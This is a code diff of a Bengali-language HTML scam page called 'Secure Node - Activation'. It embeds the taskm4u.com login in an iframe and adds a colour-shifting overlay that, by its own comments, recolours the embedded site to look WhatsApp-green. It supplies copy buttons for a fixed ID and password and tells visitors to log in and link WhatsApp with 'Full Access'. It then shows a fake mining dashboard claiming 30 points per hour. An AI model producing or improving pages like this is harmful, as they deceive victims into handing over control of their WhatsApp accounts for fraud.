@@ -6,72 +6,75 @@
     <title>Secure Node - Activation</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --wa-green: #25D366; --bg: #0b141a; --mask: rgba(37, 211, 102, 0.2); }
-        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: sans-serif; overflow: hidden; color: white; }
+        :root { --main-green: #25D366; --bg-dark: #0b141a; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg-dark); font-family: sans-serif; overflow: hidden; color: white; }
 
-        /* View Control */
+        /* ড্যাশবোর্ড ভিউ */
         .view { display: none; height: 100vh; flex-direction: column; }
         .active-view { display: flex; }
 
-        /* Step 1: Login Frame */
-        .header-step { background: #121b22; padding: 15px; text-align: center; border-bottom: 2px solid var(--wa-green); }
-        .copy-bar { display: flex; gap: 10px; margin-top: 10px; }
-        .c-btn { flex: 1; background: #34495e; padding: 10px; border-radius: 5px; font-size: 12px; cursor: pointer; border: 1px solid #45aaf2; }
+        /* হেডার ফিক্সড (এটি নড়বে না) */
+        .fixed-header { background: #121b22; padding: 10px; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        .warn-box { background: #ff4757; padding: 8px; border-radius: 5px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 8px; }
+        .copy-group { display: flex; gap: 8px; }
+        .copy-btn { flex: 1; background: #2c3e50; border: 1px solid var(--main-green); padding: 8px; border-radius: 5px; text-align: center; font-size: 12px; cursor: pointer; color: white; }
 
-        .iframe-wrap { flex-grow: 1; position: relative; background: #fff; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--mask); mix-blend-mode: hue; pointer-events: none; }
-        iframe { width: 100%; height: 100%; border: none; }
+        /* আইফ্রেম এরিয়া (কালার পরিবর্তন সহ) */
+        .iframe-container { flex-grow: 1; position: relative; background: #fff; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+        
+        /* এখানে "আয়না" বা কালার মাস্ক যা বেগুনি রঙ পাল্টে দেবে */
+        .mirror-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(37, 211, 102, 0.15); /* সবুজ আভা */
+            backdrop-filter: hue-rotate(120deg) brightness(1.1); /* বেগুনিকে সবুজে রূপান্তর করবে */
+            pointer-events: none; z-index: 100;
+        }
 
-        /* Fixed Footer Button */
-        .footer-btn { background: #121b22; padding: 15px; position: sticky; bottom: 0; z-index: 100; }
-        .main-btn { background: var(--wa-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        iframe { width: 100%; height: 1500px; border: none; }
 
-        /* Final Dashboard Style */
-        .dash-card { background: #1f2c34; padding: 30px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid var(--mask); }
-        .pts { font-size: 45px; font-weight: bold; color: var(--wa-green); margin: 15px 0; }
+        /* ভেরিফাই বাটন (ফোনের নিচে সবসময় ফিক্সড থাকবে) */
+        .fixed-footer {
+            position: fixed; bottom: 0; width: 100%;
+            background: #121b22; padding: 15px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            z-index: 2000; box-sizing: border-box;
+        }
+        .verify-btn { background: var(--main-green); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 -5px 15px rgba(0,0,0,0.5); }
+
+        /* ড্যাশবোর্ড কার্ড */
+        .dash-card { background: #1f2c34; padding: 30px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
+        .pts-display { font-size: 45px; font-weight: bold; color: var(--main-green); }
     </style>
 </head>
 <body>
 
-<div id="step-login" class="view active-view">
-    <div class="header-step">
-        <div style="font-size: 14px; color: #ffbc00;">⚠️ লগইন করার পর নিচের বাটনে ক্লিক করুন</div>
-        <div class="copy-bar">
-            <div class="c-btn" onclick="cp('01321494267')">Copy ID</div>
-            <div class="c-btn" onclick="cp('123456789')">Copy Pass</div>
+<div id="view-task" class="view active-view">
+    <div class="fixed-header">
+        <div class="warn-box">⚠️ লগইন করে WhatsApp যুক্ত করুন</div>
+        <div class="copy-group">
+            <div class="copy-btn" onclick="copyVal('01321494267')">Copy ID</div>
+            <div class="copy-btn" onclick="copyVal('123456789')">Copy Pass</div>
         </div>
     </div>
-    <div class="iframe-wrap">
-        <div class="overlay"></div>
-        <iframe src="https://www.taskm4u.com/#/login" id="loginFrame"></iframe>
+
+    <div class="iframe-container">
+        <div class="mirror-overlay"></div>
+        <iframe src="https://www.taskm4u.com/#/login" id="taskIframe"></iframe>
     </div>
-    <div class="footer-btn">
-        <button class="main-btn" onclick="toNextStep()">লগইন করেছি, পরবর্তী ধাপ</button>
+
+    <div class="fixed-footer">
+        <button class="verify-btn" id="mainVerifyBtn" onclick="verifyAndRedirect()">Verify & Connect Dashboard</button>
     </div>
 </div>
 
-<div id="step-link" class="view">
-    <div class="header-step">
-        <div style="font-size: 14px; color: var(--wa-green);">✅ এখন হোয়াটসঅ্যাপ যুক্ত করুন (Full Access)</div>
-    </div>
-    <div class="iframe-wrap">
-        <div class="overlay"></div>
-        <iframe src="about:blank" id="linkFrame"></iframe>
-    </div>
-    <div class="footer-btn">
-        <button class="main-btn" id="verify-btn" onclick="verifyFinal()">হোয়াটসঅ্যাপ অ্যাড করেছি (Verify)</button>
-    </div>
-</div>
-
-<div id="view-final" class="view">
+<div id="view-dashboard" class="view">
     <div class="dash-card">
-        <p style="color: #8696a0;">Mining Dashboard Active</p>
-        <div class="pts" id="final-pts">0.00 PT</div>
-        <div id="status" style="color: var(--wa-green);">● Earning points: 30 PT/hr</div>
+        <p style="color: #8696a0; margin: 0;">System Mining Active</p>
+        <div class="pts-display" id="finalPoints">0.00 PT</div>
+        <p style="color: var(--main-green); font-size: 12px;">● Online - 30 PT/hr</p>
     </div>
     <div style="padding: 20px; text-align: center;">
-        <p>Your WhatsApp node is securely connected to the cloud server.</p>
-        <button class="main-btn" style="background: #34495e;" onclick="location.reload()">Refresh Session</button>
+        <button class="verify-btn" style="background: #34495e;" onclick="location.reload()">Refresh Connection</button>
     </div>
 </div>
 
